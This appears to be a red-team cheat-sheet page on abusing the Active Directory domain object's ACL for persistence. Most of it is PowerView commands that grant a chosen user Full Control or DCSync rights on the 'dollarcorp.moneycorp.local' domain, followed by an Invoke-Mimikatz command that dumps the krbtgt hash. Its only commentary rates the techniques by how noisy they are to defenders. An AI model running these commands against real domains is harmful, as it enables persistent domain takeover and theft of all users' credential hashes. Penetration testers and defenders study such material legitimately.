---
description: Domain Object
---

# Domain Object

> There is an ACL for the domain object itself. We can modify (with D.A. privs) the ACL of that object and have interesting rights like full control over the domain object or the ability to run DCSync, etc.

* FullControl -> Noisy
* DCSync -> Less noisy

### Get privileges on the domain object

```bash
#Using PowerView:
Get-ObjectAcl -DistinguishedName 'dc=dollarcorp,dc=moneycorp,dc=local' -ResolveGUIDs | ? {($_.IdentityReference -match "$USER") -and (($_.ObjectType -match 'replication')) -or (($_.ActiveDirectoryRights -match 'GenericAll'))}
```

### Add Full Control

```bash
#Using PowerView:
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName $USERNAME -Rights All -Verbose
```

### Add DCSync Control

The following command can be used to execute a DCSync attack as any user without being Domain Admin. That means we can get the hashes of any user (not only krbtgt):

```bash
#Using PowerView:
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName $USERNAME -Rights DCSync -Verbose

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
